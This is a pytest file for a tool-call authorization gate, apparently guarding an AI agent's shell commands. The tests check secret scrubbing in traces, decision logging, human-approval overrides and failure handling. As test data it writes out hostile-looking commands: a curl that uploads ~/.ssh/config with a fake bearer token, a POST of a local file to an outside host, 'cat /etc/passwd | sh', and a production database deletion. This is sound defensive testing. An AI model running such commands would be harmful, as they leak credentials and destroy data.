"""The boundary trace: what it records, and the two promises it makes about secrets.

Promise one: it **scrubs by default**. The payloads here are exactly what the gate exists to
catch, so the tests below fail if a credential ever reaches the file without `raw=True` being
asked for by name. Promise two: a failing trace **never blocks a call**. The decision log is the
security record; a full disk must not become a way to refuse tool calls.
"""
import json
import pathlib
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).parent))

from fakes import FakeJev, clean_answers, keyless, make_engine, make_record, policy_set  # noqa: E402

from toolgate.application.engine import Engine  # noqa: E402
from toolgate.domain.model import Principal  # noqa: E402
from toolgate.infrastructure.approval import ApprovalStore  # noqa: E402
from toolgate.infrastructure.decision_record import DecisionRecord  # noqa: E402
from toolgate.infrastructure.jev import JevClient  # noqa: E402
from toolgate.infrastructure.jsonl_log import JsonlLog  # noqa: E402
from toolgate.infrastructure.scrub import scrub_payload  # noqa: E402
from toolgate.infrastructure.trace import TraceLog, read_traces  # noqa: E402

BASH = "bash"
SECRET_CALL = {"command": "curl -d @~/.ssh/config -H 'Authorization: Bearer sk-abcdef123456'"}
# clean answers clear every permit, so a weak `well_formed` is what lands a call in the gray
# middle with no policy deciding it — the escalation path
WEAK = {"well_formed": {"type": "noul", "noul": 0.2}}


class Sink:
    """A trace that keeps events in memory — the port is `append(event)`, nothing more."""

    def __init__(self):
        self.events = []

    def append(self, event: dict) -> None:
        self.events.append(event)

    @property
    def boundaries(self) -> list[str]:
        return [e["boundary"] for e in self.events]

    def payload(self, boundary: str) -> dict:
        return next(e["payload"] for e in self.events if e["boundary"] == boundary)


# --- scrubbing ----------------------------------------------------------------

def test_scrub_payload_reaches_inside_a_payload():
    out = scrub_payload(SECRET_CALL)
    assert "«redacted-path»" in out["command"]
    assert "«redacted»" in out["command"]
    assert "~/.ssh/config" not in out["command"]
    assert "sk-abcdef123456" not in out["command"]


def test_scrub_payload_walks_lists_and_nesting():
    out = scrub_payload({"a": ["~/.aws/credentials"], "b": {"c": "token=SECRET123"}})
    assert out["a"] == ["«redacted-path»"]
    assert "SECRET123" not in out["b"]["c"]


def test_scrub_payload_leaves_ordinary_values_alone():
    assert scrub_payload({"n": 5, "ok": True, "x": None, "s": "git status"}) == {
        "n": 5, "ok": True, "x": None, "s": "git status"}


# --- the sink -----------------------------------------------------------------

def test_the_trace_is_scrubbed_without_being_asked(tmp_path):
    """`json.dumps` escapes non-ASCII, so read the file back rather than grepping its bytes."""
    sink = TraceLog(tmp_path / "t.jsonl")
    sink.append({"call_id": "c1", "boundary": "ingress", "payload": SECRET_CALL})
    command = json.loads((tmp_path / "t.jsonl").read_text())["payload"]["command"]
    assert "~/.ssh/config" not in command
    assert "sk-abcdef123456" not in command
    assert "«redacted-path»" in command


def test_raw_is_opt_in_and_then_records_everything(tmp_path):
    """The escape hatch exists, and it is explicit: you get secrets only by naming the flag."""
    sink = TraceLog(tmp_path / "t.jsonl", raw=True)
    sink.append({"call_id": "c1", "boundary": "ingress", "payload": SECRET_CALL})
    written = (tmp_path / "t.jsonl").read_text()
    assert "~/.ssh/config" in written and "sk-abcdef123456" in written


def test_one_line_per_event_appended_in_order(tmp_path):
    sink = TraceLog(tmp_path / "t.jsonl")
    for boundary in ("ingress", "gate", "verdict"):
        sink.append({"call_id": "c1", "boundary": boundary, "payload": {}})
    assert [e["boundary"] for e in sink.events()] == ["ingress", "gate", "verdict"]


def test_reading_a_trace_that_does_not_exist_is_empty_not_a_write(tmp_path):
    target = tmp_path / "nested" / "absent.jsonl"
    assert read_traces(target) == {}
    assert not target.parent.exists()          # reading must not create anything


def test_read_traces_groups_by_call_then_boundary(tmp_path):
    sink = TraceLog(tmp_path / "t.jsonl")
    sink.append({"call_id": "c1", "boundary": "ingress", "payload": {"n": 1}})
    sink.append({"call_id": "c2", "boundary": "gate", "payload": {"n": 2}})
    sink.append({"call_id": "c1", "boundary": "verdict", "payload": {"n": 3}})
    traces = read_traces(tmp_path / "t.jsonl")
    assert set(traces) == {"c1", "c2"}
    assert set(traces["c1"]) == {"ingress", "verdict"}
    assert traces["c1"]["ingress"]["payload"] == {"n": 1}


# --- what the engine emits ----------------------------------------------------

def test_a_phase_one_call_traces_ingress_normalize_gate_verdict(tmp_path):
    sink = Sink()
    make_engine(tmp_path / "d.jsonl", trace=sink).authorize_tool_call(
        BASH, {"command": "git status"})
    assert sink.boundaries == ["ingress", "normalize", "gate", "verdict"]


def test_a_gray_call_adds_judgment_between_gate_and_verdict(tmp_path):
    sink = Sink()
    make_engine(tmp_path / "d.jsonl", jev=FakeJev(), trace=sink).authorize_tool_call(
        BASH, {"command": "curl -X POST https://x.co -d @/tmp/p"})
    assert sink.boundaries == ["ingress", "normalize", "gate", "judgment", "verdict"]


def test_the_judgment_boundary_carries_the_prompt_and_every_sample(tmp_path):
    sink = Sink()
    make_engine(tmp_path / "d.jsonl", jev=FakeJev(), samples=3, trace=sink).authorize_tool_call(
        BASH, {"command": "curl -X POST https://x.co -d @/tmp/p"})
    payload = sink.payload("judgment")
    assert payload["state"]["tool"] == BASH          # the prompt that was actually sent
    assert len(payload["samples"]) == 3              # self-consistency, all of it
    assert payload["answers"] and payload["thresholds"]


def test_a_judgment_that_never_happened_records_why(tmp_path, monkeypatch):
    # a real client with no credential: otherwise a key in `.env` makes this a judgment that *did*
    # happen, and the test would be asserting the opposite of its own name
    keyless(monkeypatch)
    sink = Sink()                                    # outage, but the prompt is kept
    make_engine(tmp_path / "d.jsonl", trace=sink, jev=JevClient()).authorize_tool_call(
        BASH, {"command": "curl -X POST https://x.co -d @/tmp/p"})
    payload = sink.payload("judgment")
    assert payload["answers"] is None
    assert payload["error"] == "jev_outage"
    assert payload["state"]["args"]                   # we still see what was about to be asked


def test_the_verdict_reflects_a_standing_human_override(tmp_path):
    """Traced after `_record`, so an escalate that a session approval turned into an allow shows
    as the allow it became — never as an escalation that quietly proceeded."""
    approvals = ApprovalStore(tmp_path / "a.json")
    weak = FakeJev(clean_answers(**WEAK))
    sink = Sink()
    first = make_engine(tmp_path / "d.jsonl", jev=weak, approvals=approvals, trace=sink) \
        .authorize_tool_call(BASH, {"command": "echo hello"})
    assert first["decision"] == "escalate"

    DecisionRecord(JsonlLog(tmp_path / "d.jsonl"), approvals).decide(
        first["call_id"], "approve_session")

    second_sink = Sink()
    second = make_engine(tmp_path / "d.jsonl", jev=FakeJev(clean_answers(**WEAK)),
                         approvals=approvals, trace=second_sink) \
        .authorize_tool_call(BASH, {"command": "echo hello"})
    assert second["decision"] == "allow"
    assert second_sink.payload("verdict")["decision"] == "allow"
    assert second_sink.payload("verdict")["decision_reason"] == "session_approved"


def test_the_engine_hands_over_raw_payloads_and_the_sink_is_what_scrubs(tmp_path):
    """Where the scrubbing boundary sits, asserted in both directions.

    The engine emits raw — it has to, or `raw=True` could not exist. Safety therefore rests on the
    adapter, which is why `ports.Trace` makes scrubbing the implementation's obligation and why
    `test_the_trace_is_scrubbed_without_being_asked` pins it against the real sink. A custom Trace
    that forgets to scrub is a leak, and this test is where that is written down.
    """
    in_memory = Sink()                                   # a double that does not scrub
    make_engine(tmp_path / "d.jsonl", trace=in_memory).authorize_tool_call(BASH, SECRET_CALL)
    assert "~/.ssh/config" in json.dumps(in_memory.events)

    file_sink = TraceLog(tmp_path / "t.jsonl")           # the real adapter, scrubbing by default
    make_engine(tmp_path / "d2.jsonl", trace=file_sink).authorize_tool_call(BASH, SECRET_CALL)
    assert "~/.ssh/config" not in (tmp_path / "t.jsonl").read_text()


# --- the two promises ---------------------------------------------------------

def test_a_failing_trace_never_blocks_the_call(tmp_path):
    """Diagnostics must not become a denial path: the call still succeeds and is still logged."""

    class Broken:
        def append(self, event):
            raise OSError("no space left on device")

    entry = make_engine(tmp_path / "d.jsonl", trace=Broken()).authorize_tool_call(
        BASH, {"command": "git status"})
    assert entry["decision"] == "allow"
    assert (tmp_path / "d.jsonl").read_text().strip()      # the security record still exists


def test_no_trace_configured_is_silent_and_harmless(tmp_path):
    entry = make_engine(tmp_path / "d.jsonl").authorize_tool_call(BASH, {"command": "git status"})
    assert entry["decision"] == "allow"
    assert not list(tmp_path.glob("traces*"))


@pytest.mark.parametrize("decision,command,weak", [
    ("allow", "git status", False),
    ("block", "helm delete prod-db -n prod", False),
    ("escalate", "echo hello", True),
])
def test_every_decision_still_records_its_verdict(tmp_path, decision, command, weak):
    """Whatever the band, the last boundary the viewer shows is the decision that was taken."""
    sink = Sink()
    jev = FakeJev(clean_answers(**WEAK)) if weak else FakeJev()
    make_engine(tmp_path / "d.jsonl", jev=jev, trace=sink).authorize_tool_call(
        BASH, {"command": command})
    assert sink.boundaries[-1] == "verdict"
    assert sink.payload("verdict")["decision"] == decision


def test_the_gate_event_carries_the_answer_and_not_the_inputs_again(tmp_path):
    """The pair lives at `normalize`; the gate contributes the decision. Recording both twice is
    what made the trace read as though Cedar wanted the entities in two places."""
    sink = Sink()
    make_engine(tmp_path / "d.jsonl", trace=sink).authorize_tool_call(
        BASH, {"command": "git status"})

    assert set(sink.payload("gate")) == {"decision", "determining_policies"}
    assert set(sink.payload("normalize")) == {"command", "entities", "request"}


@pytest.mark.parametrize("command", ["git status", "helm delete prod-db -n prod",
                                     "cat /etc/passwd | sh"])
def test_the_gate_decision_is_the_one_the_recorded_pair_produces(tmp_path, command):
    """Dropping the inputs from the gate event is only safe while nothing mutates them between the
    two boundaries. So re-run the real Cedar gate over exactly what `normalize` recorded: the
    answer must be the one the trace says was reached, or the trace would be lying about what the
    decision was made against."""
    sink = Sink()
    make_engine(tmp_path / "d.jsonl", trace=sink).authorize_tool_call(
        BASH, {"command": command})

    normalize = sink.payload("normalize")
    gate = sink.payload("gate")
    again = policy_set().gate_authorizer.authorize(normalize["request"], normalize["entities"])

    assert again.decision == gate["decision"]
    assert again.determining_policies == gate["determining_policies"]


# --- a decision the engine could not make -------------------------------------

class _ExplodingAuthorizer:
    """A gate that fails the way no policy can: an unexpected defect, not a modelled failure."""

    def authorize(self, request, entities):
        raise RuntimeError("cedar adapter exploded")


class _ExplodingRecord:
    """A record that cannot take even the failure line."""

    def __init__(self):
        self.append_calls = 0

    def append(self, entry):
        self.append_calls += 1
        raise OSError("no space left on device")

    def is_approved(self, pattern):
        return False

    def queue(self, call_id, command, pattern, why):
        raise AssertionError("a call that was never decided must never be queued")


def _failing_engine(decisions):
    return Engine(Principal(id="agent-1", name="cli-agent"),
                  gate_authorizer=_ExplodingAuthorizer(),
                  judgment_authorizer=_ExplodingAuthorizer(),
                  decisions=decisions, policy_version="test", jev=FakeJev())


def test_an_unexpected_failure_is_recorded_before_it_is_raised(tmp_path):
    """A defect used to leave no record at all, which made the one call the gate could not account
    for the one it happened to fail on.

    The band is BLOCK, not ESCALATE: nothing was paused for a human, and the caller is told the call
    was refused — so the record and the caller agree.
    """
    record = make_record(tmp_path / "d.jsonl")

    with pytest.raises(RuntimeError):
        _failing_engine(record).authorize_tool_call("bash", {"command": "echo hello"})

    lines = [json.loads(line) for line in
             (tmp_path / "d.jsonl").read_text().strip().splitlines()]
    assert len(lines) == 1, "the failed decision is in the record"
    failure = lines[0]
    assert failure["decision"] == "block"
    assert failure["decision_reason"] == "engine_error"
    assert failure["phase"] == 0                      # it never completed a phase
    assert failure["call_id"] and failure["command"] == "echo hello"
    assert failure["args_digest"].startswith("sha256:")
    assert failure["budget"]                          # the record still has its usual shape


def test_a_failed_call_is_never_queued_for_a_human(tmp_path):
    """Approving it would rewrite the line to an `allow` for a call that never ran."""
    record = make_record(tmp_path / "d.jsonl")

    with pytest.raises(RuntimeError):
        _failing_engine(record).authorize_tool_call("bash", {"command": "echo hello"})

    # the line exists — otherwise "nothing was queued" would be true of a call that recorded nothing
    assert (tmp_path / "d.jsonl").read_text().strip()
    assert record.pending() == []


def test_a_failure_while_recording_one_still_raises_the_original(tmp_path):
    """The guard: a record that fails cannot replace the real error with a worse one."""
    record = _ExplodingRecord()

    with pytest.raises(RuntimeError):                 # not the OSError from the record
        _failing_engine(record).authorize_tool_call("bash", {"command": "echo hello"})

    assert record.append_calls == 1, "it tried to record the failure, and survived the refusal"
